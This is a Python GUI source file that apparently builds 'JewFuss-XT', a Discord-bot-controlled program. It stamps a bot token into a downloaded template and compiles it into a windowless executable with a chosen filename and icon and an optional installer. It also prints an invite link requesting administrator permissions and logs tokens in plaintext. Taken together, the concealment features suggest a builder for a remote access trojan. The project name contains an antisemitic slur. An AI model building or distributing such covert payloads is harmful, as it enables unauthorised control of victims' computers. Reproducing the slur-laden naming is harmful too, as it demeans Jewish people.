import urllib.request, tkinter as tk, subprocess, threading, requests
import tempfile, shutil, json, time, sys, os, re
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
DATA_DIR    = os.path.join(BASE_DIR, 'data')
OUTPUT_DIR  = os.path.join(BASE_DIR, 'builds')
TEMPLATE    = os.path.join(BASE_DIR, 'JewFuss-XT.py')
CONFIG_PATH = os.path.join(DATA_DIR, 'config.json')
LOG_FILE    = os.path.join(OUTPUT_DIR, 'easy-compiler-build.log')
LATEST      = "https://raw.githubusercontent.com/gabrielzv1233/JewFuss-XT/refs/heads/main/JewFuss-XT.py"
RECOMMENDED = (3,11,9)

class BuilderUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("JewFuss-XT Builder")
        self.geometry("900x360")
        self.minsize(900, 360)

        self.columnconfigure(0, weight=1)
        self.rowconfigure(0, weight=1)

        os.makedirs(DATA_DIR, exist_ok=True)
        os.makedirs(OUTPUT_DIR, exist_ok=True)

        self.token_valid = False
        self.filename_valid = False
        self.icon_path = None
        self.bot_username = None
        self.bot_id = None

        self.load_config()
        self.create_widgets()
        self.check_python()
        self.check_update()

        self.token_var.trace_add('write', lambda *a: self.on_token_change())
        threading.Thread(target=self.boot_validate, daemon=True).start()

    def create_widgets(self):
        frm = ttk.Frame(self, padding=10)
        frm.grid(row=0, column=0, sticky="nsew")
        frm.columnconfigure(0, weight=1)

        ttk.Label(frm, text="Bot token:").grid(row=0, column=0, sticky="w")
        self.token_var = tk.StringVar(value=self.config.get("token",""))
        self.ent_token = ttk.Entry(frm, textvariable=self.token_var)
        self.ent_token.grid(row=1, column=0, sticky="ew", pady=(0,5))
        self.token_err = tk.StringVar()
        ttk.Label(frm, textvariable=self.token_err, foreground="red")\
            .grid(row=2, column=0, sticky="w")

        ttk.Label(frm, text="Exe filename:").grid(row=3, column=0, sticky="w")
        self.exe_var = tk.StringVar(value=self.config.get("exe_filename","JewFuss-XT.exe"))
        self.ent_exe = ttk.Entry(frm, textvariable=self.exe_var)
        self.ent_exe.grid(row=4, column=0, sticky="ew", pady=(0,5))

        ttk.Label(frm, text="Icon (optional):").grid(row=5, column=0, sticky="w")
        self.icon_btn = ttk.Button(frm, text="Choose Icon", command=self.choose_icon)
        self.icon_btn.grid(row=6, column=0, sticky="w", pady=(0,5))

        prev_icon = os.path.join(DATA_DIR, "prev_icon.ico")
        if os.path.isfile(prev_icon):
            self.icon_path = prev_icon
            self.show_icon(prev_icon)
            print(f"Loaded previous icon")

        self.installer_var = tk.BooleanVar(value=self.config.get("compile_installer", False))
        self.cb_installer = ttk.Checkbutton(frm, text="Compile installer?", variable=self.installer_var)
        self.cb_installer.grid(row=7, column=0, sticky="w", pady=(5,10))

        self.build_btn = ttk.Button(frm, text="Compile", command=self.build)
        self.build_btn.grid(row=8, column=0, sticky="w")

        self.update_build_state()

    def load_config(self):
        self.config = {}
        if os.path.isfile(CONFIG_PATH):
            with open(CONFIG_PATH,'r',encoding='utf-8') as f:
                self.config = json.load(f)
            print("Config loaded:", self.config)

    def save_config(self):
        d = {
            "token": self.token_var.get().strip(),
            "exe_filename": self.exe_var.get().strip(),
            "compile_installer": self.installer_var.get()
        }
        with open(CONFIG_PATH,'w',encoding='utf-8') as f:
            json.dump(d, f, indent=2)
        print("Config saved")

    def boot_validate(self):
        fn = self.exe_var.get().strip() or "JewFuss-XT.exe"
        self.exe_var.set(fn)
        self.filename_valid = bool(fn)
        tok = self.token_var.get().strip()
        if self._check_token(tok):
            self.after(0, lambda: self.token_err.set("Format OK, checking…"))
            self._validate_token_thread()
        else:
            self.after(0, lambda: self.token_err.set("Invalid format"))
            self.after(0, self.update_build_state)

    def on_token_change(self):
        tok = self.token_var.get().strip()
        if self._check_token(tok):
            self.token_err.set("Format OK, checking…")
            self._validate_token_thread()
        else:
            self.token_err.set("Invalid format")
            self.token_valid = False
            self.update_build_state()

    def _check_token(self, t):
        parts = t.split('.')
        return len(t)==72 and len(parts)==3 and len(parts[0])==26 and len(parts[1])==6 and len(parts[2])==38

    def _validate_token_thread(self):
        def work():
            tok = self.token_var.get().strip()
            try:
                r = requests.get("https://discord.com/api/v10/users/@me",
                                 headers={"Authorization":f"Bot {tok}"})
                if r.status_code == 200:
                    info = r.json()
                    self.bot_username = f"{info['username']}#{info['discriminator']}"
                    self.bot_id = info['id']
                    self.token_valid = True
                    print(f"Token validated for {self.bot_username}")
                    msg = ""
                else:
                    self.token_valid = False
                    msg = f"Invalid token ({r.status_code})"
                self.after(0, lambda: self.token_err.set(msg))
            except Exception as e:
                self.token_valid = False
                print("Token validation error:", e)
                self.after(0, lambda: self.token_err.set("API error"))
            self.after(0, self.update_build_state)

        threading.Thread(target=work, daemon=True).start()

    def update_build_state(self):
        if self.token_valid and self.filename_valid:
            self.build_btn.state(["!disabled"])
        else:
            self.build_btn.state(["disabled"])

    def disable_inputs(self):
        for w in (self.ent_token, self.ent_exe, self.icon_btn, self.build_btn, self.cb_installer):
            try: w.state(["disabled"])
            except: w.config(state="disabled")

    def enable_inputs(self):
        for w in (self.ent_token, self.ent_exe, self.icon_btn, self.build_btn, self.cb_installer):
            try: w.state(["!disabled"])
            except: w.config(state="normal")
        self.update_build_state()

    def check_python(self):
        cv = sys.version_info[:3]
        if cv != RECOMMENDED:
            messagebox.showwarning("Python version", f"Using {cv}, recommended {RECOMMENDED}")
            print(f"Warning: Python {cv}, recommended {RECOMMENDED}")

    def check_update(self):
        try:
            lines = urllib.request.urlopen(LATEST).read().decode().splitlines()
            remote = next((re.search(r'version\s*=\s*"([\d.]+)"', l).group(1)
                           for l in lines if "- 25c75g" in l), None)
            local = None
            if os.path.isfile(TEMPLATE):
                for l in open(TEMPLATE, encoding='utf-8'):
                    if "- 25c75g" in l:
                        local = re.search(r'version\s*=\s*"([\d.]+)"', l).group(1)
                        break
            if remote and local and tuple(map(int, local.split("."))) < tuple(map(int, remote.split("."))):
                messagebox.showinfo("Update available", f"{local} → {remote}")
                print(f"Update available: {local} → {remote}")
        except Exception as e:
            print("Update check failed:", e)

    def choose_icon(self):
        p = filedialog.askopenfilename(filetypes=[("Images","*.ico *.png *.jpg")])
        if p:
            self.icon_path = p
            self.show_icon(p)
            print(f"Icon selected: {p}")

    def show_icon(self, path):
        img = Image.open(path)
        img.thumbnail((128,128))
        self.tkimg = ImageTk.PhotoImage(img)
        self.icon_btn.config(image=self.tkimg, text="")

    def build(self):
        self.save_config()
        if not self.token_valid:
            messagebox.showerror("Error", "Invalid token")
            return

        self.disable_inputs()
        print("Starting buildprocess")
        threading.Thread(target=self.run_build, daemon=True).start()

    def run_build(self):
        lines = open(TEMPLATE, 'r', encoding='utf-8').read().splitlines()
        for i, l in enumerate(lines):
            if " - 23r98h" in l:
                lines[i] = f'TOKEN = "{self.token_var.get().strip()}"'
                break

        tmpd = tempfile.mkdtemp()
        tf = os.path.join(tmpd, 'temp.py')
        with open(tf, 'w', encoding='utf-8') as f:
            f.write("\n".join(lines))

        out_name = self.exe_var.get().strip()
        outpth = os.path.join(OUTPUT_DIR, out_name)
        if os.path.isfile(outpth):
            bak = time.strftime('%Y-%m-%d-%H-%M-%S-') + out_name
            os.rename(outpth, os.path.join(OUTPUT_DIR, bak))

        cmd = [
            sys.executable, '-m', 'PyInstaller', tf,
            '--onefile','--windowed','--noconsole',
            f'--distpath={OUTPUT_DIR}',
            f'--workpath={DATA_DIR}',
            f'--specpath={DATA_DIR}',
            f'-n={out_name}'
        ]
        if self.icon_path:
            cmd += ['--icon', self.icon_path]

        print("Building JewFuss-XT")
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE, close_fds=True).wait()
        shutil.rmtree(tmpd)

        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        invite = f"https://discord.com/oauth2/authorize?client_id={self.bot_id}&permissions=8&scope=bot"

        if os.path.isfile(outpth):
            if self.installer_var.get():
                installer_py = os.path.join(BASE_DIR, "installer.py")
                print("Building installer")
                subprocess.Popen(
                    [sys.executable, installer_py, f'--file={out_name}'],
                    cwd=OUTPUT_DIR,
                    creationflags=subprocess.CREATE_NEW_CONSOLE,
                    close_fds=True
                ).wait()

                explorer_target = os.path.join(OUTPUT_DIR, "installer.exe")
            else:
                explorer_target = outpth

            os.system(f'explorer /select,"{explorer_target}"')
            time.sleep(0.5)
            print(f"\nCompiled JewFuss-XT as {self.bot_username}")
            print(f"Bot invite link: {invite}")
            with open(LOG_FILE, 'a', encoding='utf-8') as log_file:
                log_file.write(f"\"{timestamp}\": TOKEN = \"{self.token_var.get().strip()}\" ({self.bot_username}) - {out_name}\n")

            self.after(0, lambda: messagebox.showinfo(
                "Build Complete",
                f"Compiled JewFuss-XT as {self.bot_username}\nCheck console for invite link"
            ))

        else:
            print("Error: JewFuss-XT was unable to compile")

        self.after(0, self.enable_inputs)

if __name__ == "__main__":
    BuilderUI().mainloop()
